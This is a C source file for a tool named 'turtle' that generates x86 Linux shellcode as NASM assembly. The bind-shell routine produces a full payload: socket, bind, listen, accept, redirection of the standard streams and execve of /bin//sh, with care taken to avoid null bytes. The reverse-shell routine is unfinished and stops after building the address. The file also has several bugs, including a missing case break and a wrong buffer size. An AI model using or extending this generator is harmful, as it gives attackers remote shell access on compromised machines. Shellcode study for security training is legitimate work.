#define _XOPEN_SOURCE   700             // needed for dprintf

#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>

#define REG_PORT_MIN    1024            // lowest registered port
#define DEFAULT_PATH    "temp.nasm"
#define SKIP_PARAM      (-1)              // omit parameter to syscall
#define IPV4_STRLEN     (strlen("xxx.xxx.xxx.xxx") + 1)

typedef enum {eax, ebx, ecx, edx, esi, esp} reg32_t;
typedef enum {bind_shell, reverse_shell, misc_shell} shellcode_t;

int temp_fd;

const char * header = "; Generated by turtle\n\n"
                        "global _start\n\n"
                        "section .text\n"
                        "_start:\n\n";

/* Helper functions */
static const char * enum2reg32(reg32_t reg);
static const char * enum2reg16(reg32_t reg);
static const char * enum2reg8lo(reg32_t reg);
static const char * enum2reg8hi(reg32_t reg);  
static void store_in_reg(uint32_t value, reg32_t reg);

/* To write "recipes" for bind shell, reverse shell, etc. */
static void build_syscall4(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx,
    uint32_t arg_edx, uint32_t arg_esi); 
static void build_syscall3(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx,
    uint32_t arg_edx); 
static void build_syscall2(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx); 
static void store_result(reg32_t result, reg32_t destination);
static void build_sockaddr(uint32_t ipv4, uint16_t port, uint16_t family);
static void build_stackstring(const char * text);

/* Supported shellcode recipes */        
static void make_bind_shell(int temp_fd, uint16_t port);
static void make_reverse_shell(int temp_fd, uint16_t port, struct in_addr * ipv4);

static void build_stackstring(const char * text)
{
    size_t len = strlen(text);
    size_t chunk = sizeof(uint32_t);    // 4 bytes per register

    if (0 == len)
    {
        // nothing to do
        return;
    }
    else if ((len % 4) != 0)
    {
        fprintf(stderr, "[!] string length of %d (%s) not supported!\n"
            "\t(Must be evenly divisible by 4.)\n", len, text);
        return;
    } 

    dprintf(temp_fd, "\txor eax, eax\n"
        "\tpush eax\t\t; NULL terminator\n\n");

    /* Grab 4 byte chunks of string from end to beginning */
    for (ssize_t offset = (len - chunk); offset >= 0; offset -= chunk)
    {
        uint32_t current;
        memcpy(&current, &(text[offset]), chunk);
        
        store_in_reg(current, eax);
        dprintf(temp_fd, "\tpush eax\t\t; %.*s\n\n",
            4, &(text[offset]));        
    }
}

static void build_sockaddr(uint32_t ipv4, uint16_t port, uint16_t family)
{
    uint16_t endian_corrected;

    if (0 == ipv4)
    {
        dprintf(temp_fd, "\txor eax, eax\t\t; INADDR_ANY\n"
            "\tpush eax\n");
    }
    else
    {
        char * addr_string = calloc(1, IPV4_STRLEN);
        addr_string = inet_ntop(AF_INET, &ipv4, addr_string,
sizeof(uint32_t));
        if (NULL == addr_string)
        {
            perror("inet_ntop()");
        }
        dprintf(temp_fd, "\txor eax, eax\t\t; %s\n", addr_string);
        // TODO(milnor): loop through the bytes and add if non-NULL..
        dprintf(temp_fd, "\tpush eax\n");
        free(addr_string);
    }

    endian_corrected = htons(port);
    dprintf(temp_fd, "\tpush word 0x%04x\t; PORT=%d\n",
        endian_corrected, port);

    // these are always one byte numbers?
    dprintf(temp_fd, "\tpush word %d\t\t; Family=%d\n\n", 
        family, family);    
}

static const char * enum2reg8hi(reg32_t reg)
{
    char * reg_name;

    switch(reg)
    {
        case eax:
            reg_name = "ah";
            break;
        case ebx:
            reg_name = "bh";
            break;
        case ecx:
            reg_name = "ch";
            break;
        case edx:
            reg_name = "dh";
            break;
        default:
            // Including esi, which lacks a hi 8-bit equivalent
            reg_name = "ERR";
            fprintf(stderr, "[-] Unsupported register #%d\n", reg);
    }

    return reg_name;
}

static void store_result(reg32_t result, reg32_t destination)
{
    dprintf(temp_fd, "\tmov %s, %s\t\t; storing result\n\n",
        enum2reg32(destination), enum2reg32(result));
}

static const char * enum2reg8lo(reg32_t reg)
{
    char * reg_name;

    switch(reg)
    {
        case eax:
            reg_name = "al";
            break;
        case ebx:
            reg_name = "bl";
            break;
        case ecx:
            reg_name = "cl";
            break;
        case edx:
            reg_name = "dl";
            break;
        case esi:
            reg_name = "sil";
        default:
            reg_name = "ERR";
            fprintf(stderr, "[-] Unsupported register #%d\n", reg);
    }

    return reg_name;
}

static const char * enum2reg16(reg32_t reg)
{
    char * reg_name;

    switch(reg)
    {
        case eax:
            reg_name = "ax";
            break;
        case ebx:
            reg_name = "bx";
            break;
        case ecx:
            reg_name = "cx";
            break;
        case edx:
            reg_name = "dx";
            break;
        case esi:
            reg_name = "si";
            break;
        default:
            reg_name = "ERR";
            fprintf(stderr, "[-] Unsupported register #%d\n", reg);
    }

    return reg_name;
}

static const char * enum2reg32(reg32_t reg)
{
    char * reg_name;

    switch(reg)
    {
        case eax:
            reg_name = "eax";
            break;
        case ebx:
            reg_name = "ebx";
            break;
        case ecx:
            reg_name = "ecx";
            break;
        case edx:
            reg_name = "edx";
            break;
        case esi:
            reg_name = "esi";
            break;
        case esp:
            reg_name = "esp";
            break;
        default:
            reg_name = "ERR";
            fprintf(stderr, "[-] Unsupported register #%d\n", reg);
    }

    return reg_name;
}

static void store_in_reg(uint32_t value, reg32_t reg)
{
    if (value > UINT16_MAX)
    {
        // No need to zero it out first
        dprintf(temp_fd, "\tmov %s, %d\n",
            enum2reg32(reg), value);
        // TODO: handle zeros in 0xZZ000000
    }
    else if (value <= UINT8_MAX)
    {
        dprintf(temp_fd, "\txor %s, %s\n", 
            enum2reg32(reg), enum2reg32(reg));  

        if (0 == value)
        {
            return;
        }
        else
        {
            dprintf(temp_fd, "\tmov %s, %d\n",
                enum2reg8lo(reg), value);
        }  
    }
    else if (value <= UINT16_MAX)
    {

        dprintf(temp_fd, "\txor %s, %s\n", 
            enum2reg32(reg), enum2reg32(reg));    

        if ((value & 0xff00) == value)
        {
            // Avoid null if lower order byte is 0x00
            dprintf(temp_fd, "\tmov %s, %d\n",
                enum2reg8hi(reg), value >> 8);
        }
        else
        {
            dprintf(temp_fd, "\tmov %s, %d\n",
                enum2reg16(reg), value);
        } 

    }
    else
    {
        dprintf(temp_fd, "\t; Unexpected error\n");
    }
}

static void build_syscall2(uint16_t syscall, uint32_t arg_ebx, 
    uint32_t arg_ecx)
{
    dprintf(temp_fd, "\t; Syscall %d: (%d, %d)\n",
        syscall, arg_ebx, arg_ecx);

    store_in_reg(syscall, eax);
    if (arg_ebx != SKIP_PARAM)
    {
        store_in_reg(arg_ebx, ebx);
    }
    if (arg_ecx != SKIP_PARAM)
    {
        store_in_reg(arg_ecx, ecx);
    }

    dprintf(temp_fd, "\tint 0x80\n\n");
}

static void build_syscall3(uint16_t syscall, uint32_t arg_ebx, 
    uint32_t arg_ecx, uint32_t arg_edx)
{
    dprintf(temp_fd, "\t; Syscall %d: (%d, %d, %d)\n",
        syscall, arg_ebx, arg_ecx, arg_edx);

    store_in_reg(syscall, eax);
    if (arg_ebx != SKIP_PARAM)
    {
        store_in_reg(arg_ebx, ebx);
    }
    if (arg_ecx != SKIP_PARAM)
    {
        store_in_reg(arg_ecx, ecx);
    }
    if (arg_edx != SKIP_PARAM)
    {
        store_in_reg(arg_edx, edx);
    }
    dprintf(temp_fd, "\tint 0x80\n\n"); 
} 

static void build_syscall4(uint16_t syscall, uint32_t arg_ebx, 
    uint32_t arg_ecx, uint32_t arg_edx, uint32_t arg_esi)
{
    dprintf(temp_fd, "\t; Syscall %d: (%d, %d, %d, %d)\n",
        syscall, arg_ebx, arg_ecx, arg_edx, arg_esi);

    store_in_reg(syscall, eax);
    if (arg_ebx != SKIP_PARAM)
    {
        store_in_reg(arg_ebx, ebx);
    }
    if (arg_ecx != SKIP_PARAM)
    {
        store_in_reg(arg_ecx, ecx);
    }
    if (arg_edx != SKIP_PARAM)
    {
        store_in_reg(arg_edx, edx);
    }
    if (arg_esi != SKIP_PARAM)
    {
        store_in_reg(arg_esi, esi);
    }
    dprintf(temp_fd, "\tint 0x80\n\n"); 
} 

static void make_bind_shell(int temp_fd, uint16_t port)
{

    // socket(AF_INET, SOCK_STREAM, 0)
    build_syscall3(SYS_socket, AF_INET, SOCK_STREAM, 0);
    
    // store socket fd
    store_result(eax, ebx);

    // build sockaddr on the stack
    build_sockaddr(INADDR_ANY, port, AF_INET);

    // stack pointer into ecx
    store_result(esp, ecx); 

    // bind(fd, sockaddr *, sizeof(sockaddr))
    build_syscall3(SYS_bind, SKIP_PARAM, SKIP_PARAM, sizeof(struct sockaddr));
    /* fd was placed in ebx with store_result()
     * sockaddr * was placed in ecx with store_result()
     */

    // listen(fd, backlog)
    build_syscall2(SYS_listen, SKIP_PARAM, 1);
    /* fd was set previously
     */

    // accept(fd, 0, 0)
    build_syscall4(SYS_accept4, SKIP_PARAM, 0, 0, 0); 
    // accept is in syscall table and yet not supported... odd.

    // pass connected fd to next syscall
    store_result(eax, ebx);

    // Assembly will be more verbose than if hand-coded
    build_syscall2(SYS_dup2, SKIP_PARAM, STDIN_FILENO);
    build_syscall2(SYS_dup2, SKIP_PARAM, STDOUT_FILENO);
    build_syscall2(SYS_dup2, SKIP_PARAM, STDERR_FILENO);

    // Store "/bin//sh" on the stack
    build_stackstring("/bin//sh");
    store_result(esp, ebx);

    // execve("/bin//sh", NULL, NULL)
    build_syscall3(SYS_execve, SKIP_PARAM, 0, 0);
}

static void make_reverse_shell(int temp_fd, uint16_t port, struct in_addr * ipv4)
{
    // socket(AF_INET, SOCK_STREAM, 0)
    build_syscall3(SYS_socket, AF_INET, SOCK_STREAM, 0);
    
    // store socket fd
    store_result(eax, ebx);

    // build sockaddr on the stack
    build_sockaddr(ipv4->s_addr, port, AF_INET);

    // stack pointer into ecx
    store_result(esp, ecx); 
    free(ipv4);
}

int main(int argc, char * argv[])
{
    uint16_t port = 0;
    shellcode_t mode = misc_shell;
    struct in_addr * ipv4 = calloc(1, sizeof(struct in_addr));
    ssize_t written = 0;

    /* Parse arguments or die trying */
    if (argc < 2)
    {
        printf("Usage:\n" 
            "\t%s <port number> \t\t\t// bind shell\n"
            "\t%s <ip address> <port number> \t// reverse shell\n"
            "\tE.g. %s 1337\n"
            "\tE.g. %s 192.168.33.52 4444\n", 
            argv[0], argv[0], argv[0], argv[0]);

        return EXIT_FAILURE;
    }
    else if (argc == 2)
    {
        mode = bind_shell;
        port = atoi(argv[1]);

        printf("[!] Generating bind shell on port %d.\n", port);
    }
    else if (argc > 2)
    {
        mode = reverse_shell;
        int ret = inet_pton(AF_INET, argv[1], ipv4);
        if (1 != ret)
        {
            fprintf(stderr, "[-] %s is not a valid IPv4 address.\n", argv[1]);
            return EXIT_FAILURE;
        }
        port = atoi(argv[2]);

        /* ignore any extraneous arguments */

        printf("[!] Generating reverse shell to %s:%d.\n", argv[1], port);
    }
    
    if (0 == port)
    {
        printf("[!] Port 0? Living dangerously, eh.\n");
    }
    if (port < REG_PORT_MIN)
    {
        printf("[!] You may need root to bind to a port below %d\n",
            REG_PORT_MIN);
    }    

    /* Create output file */
    temp_fd = open(DEFAULT_PATH, O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);

    if (temp_fd < 0)
    {
        perror("open()");
        return EXIT_FAILURE;
    }

    written = write(temp_fd, header, strlen(header));

    /* Generate assembly */
    if (bind_shell == mode)
    {
        make_bind_shell(temp_fd, port); 
    }
    else if (reverse_shell == mode)
    {
        make_reverse_shell(temp_fd, port, ipv4);
    }
    else
    {
        /* nothing else supported yet */
        fprintf(stderr, "[-] unknown shellcode specification\n");
        close(temp_fd);
        return EXIT_FAILURE;
    }

    /* Clean up */
    if (close(temp_fd))
    {
        perror("close()");
        return EXIT_FAILURE;
    }

    printf("[+] Generated %s.\n", DEFAULT_PATH); 

    return EXIT_SUCCESS;
}
